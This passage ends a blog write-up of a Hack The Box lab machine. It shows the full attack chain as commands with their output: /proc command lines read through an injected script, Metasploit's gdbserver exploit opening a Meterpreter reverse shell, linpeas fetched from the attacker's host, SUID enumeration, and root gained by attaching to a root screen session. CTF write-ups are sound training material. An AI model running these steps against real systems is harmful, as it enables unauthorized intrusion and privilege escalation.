</span></span><span style=display:flex><span>/proc/840/cmdline/proc/840/cmdline/proc/840/cmdline/bin/sh-cwhile true;<span style=color:#66d9ef>do</span> sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root <span style=color:#ae81ff>\;</span>; <span style=color:#66d9ef>done</span>&lt;script&gt;window.close<span style=color:#f92672>()</span>&lt;/script&gt;
</span></span><span style=display:flex><span><span style=color:#75715e>#842</span>
</span></span><span style=display:flex><span>/proc/842/cmdline/proc/842/cmdline/proc/842/cmdline/bin/sh-cwhile true;<span style=color:#66d9ef>do</span> su user -c <span style=color:#e6db74>&#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&#34;</span>; <span style=color:#66d9ef>done</span>&lt;script&gt;window.close<span style=color:#f92672>()</span>&lt;/script&gt;
</span></span><span style=display:flex><span><span style=color:#75715e>#836</span>
</span></span><span style=display:flex><span>/proc/836/cmdline/proc/836/cmdline/proc/836/cmdline/sbin/agetty-o-p -- <span style=color:#ae81ff>\u</span>--nocleartty1linux&lt;script&gt;window.close<span style=color:#f92672>()</span>&lt;/script&gt;
</span></span><span style=display:flex><span><span style=color:#75715e>#852</span>
</span></span><span style=display:flex><span>/proc/852/cmdline/proc/852/cmdline/proc/852/cmdlinesshd: /usr/sbin/sshd -D <span style=color:#f92672>[</span>listener<span style=color:#f92672>]</span> <span style=color:#ae81ff>0</span> of 10-100 startups&lt;script&gt;window.close<span style=color:#f92672>()</span>&lt;/script&gt;
</span></span></code></pre></div><p><code>gdbserver</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo msfdb run
</span></span><span style=display:flex><span>msf6 &gt; use exploit/multi/gdb/gdb_server_exec
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
</span></span><span style=display:flex><span><span style=color:#75715e># Options</span>
</span></span><span style=display:flex><span>set payload linux/x64/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>set RHOSTS 10.10.11.125
</span></span><span style=display:flex><span>set RPORT <span style=color:#ae81ff>1337</span>
</span></span><span style=display:flex><span>set lhost tun0
</span></span><span style=display:flex><span>run
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.14.25:4444 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.11.125:1337 - Performing handshake with gdbserver...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.11.125:1337 - Stepping program to find PC...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.11.125:1337 - Executing the payload...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>3012548</span> bytes<span style=color:#f92672>)</span> to 10.10.11.125
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>10.10.14.25:4444 -&gt; 10.10.11.125:47602<span style=color:#f92672>)</span> at 2022-02-24 03:30:28 -05
</span></span></code></pre></div><h4 id=41-shell-balance>4.1 shell balance<a hidden class=anchor aria-hidden=true href=#41-shell-balance>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>shell
</span></span><span style=display:flex><span>which python
</span></span><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
</span></span></code></pre></div><p><code>user.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>f2a0d92************
</span></span></code></pre></div><h3 id=5-enumeration>5. Enumeration<a hidden class=anchor aria-hidden=true href=#5-enumeration>#</a></h3><p>linpeas</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl 10.10.14.25:8000/linpeas.sh -o linpeas.sh
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>chmod +x linpeas.sh
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>                                         ╔═══════════════════╗                                                                
</span></span><span style=display:flex><span>═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                       
</span></span><span style=display:flex><span>                                         ╚═══════════════════╝                                                                
</span></span><span style=display:flex><span>╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                              
</span></span><span style=display:flex><span>╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                   
</span></span><span style=display:flex><span>strings Not Found                                                                                                             
</span></span><span style=display:flex><span>-rwsr-xr-- <span style=color:#ae81ff>1</span> root messagebus 51K Jun <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                     
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 15K Jul  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2019</span> /usr/lib/eject/dmcrypt-get-device                                                     
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 23K May <span style=color:#ae81ff>26</span>  <span style=color:#ae81ff>2021</span> /usr/lib/policykit-1/polkit-agent-helper-1                                            
</span></span><span style=display:flex><span>^<span style=color:#f92672>[[</span>1;5D-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 463K Jul <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2021</span> /usr/lib/openssh/ssh-keysign                                                  
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 67K Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/passwd  ---&gt;  Apple_Mac_OSX<span style=color:#f92672>(</span>03-2006<span style=color:#f92672>)</span>/Solaris_8/9<span style=color:#f92672>(</span>12-2004<span style=color:#f92672>)</span>/SPARC_8/9/Sun_Solar
</span></span><span style=display:flex><span>is_2.3_to_2.5.1<span style=color:#f92672>(</span>02-1997<span style=color:#f92672>)</span>                                                                                                      
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 84K Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/chfn  ---&gt;  SuSE_9.3/10                                                      
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 87K Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/gpasswd                                                                      
</span></span><span style=display:flex><span>-rwsr-sr-x <span style=color:#ae81ff>1</span> daemon daemon 55K Nov <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2018</span> /usr/bin/at  ---&gt;  RTru64_UNIX_4.0g<span style=color:#f92672>(</span>CVE-2002-1614<span style=color:#f92672>)</span>                                
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 67K Jul <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2020</span> /usr/bin/su                                                                           
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 163K Jan <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2021</span> /usr/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable                         
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 44K Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/newgrp  ---&gt;  HP-UX_10.20                                                    
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 39K Mar  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2020</span> /usr/bin/fusermount                                                                   
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 464K Feb <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2021</span> /usr/bin/screen  ---&gt;  GNU_Screen_4.5.0                                              
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 39K Jul <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2020</span> /usr/bin/umount  ---&gt;  BSD/Linux<span style=color:#f92672>(</span>08-1996<span style=color:#f92672>)</span>                                             
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 55K Jul <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2020</span> /usr/bin/mount  ---&gt;  Apple_Mac_OSX<span style=color:#f92672>(</span>Lion<span style=color:#f92672>)</span>_Kernel_xnu-1699.32.7_except_xnu-1699.24.8   
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 52K Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/chsh                                                                         
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 31K May <span style=color:#ae81ff>26</span>  <span style=color:#ae81ff>2021</span> /usr/bin/pkexec  ---&gt;  Linux4.10_to_5.1.17<span style=color:#f92672>(</span>CVE-2019-13272<span style=color:#f92672>)</span>/rhel_6<span style=color:#f92672>(</span>CVE-2011-1485<span style=color:#f92672>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>screen -x root/root
</span></span></code></pre></div><p>root:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>root.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>db4c739******
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul><nav class=paginav><a class=next href=https://cadil.github.io/posts/2024-03-04-htb-pandora-writeup/><span class=title>Дараах »</span><br><span>HTB - Pandora</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>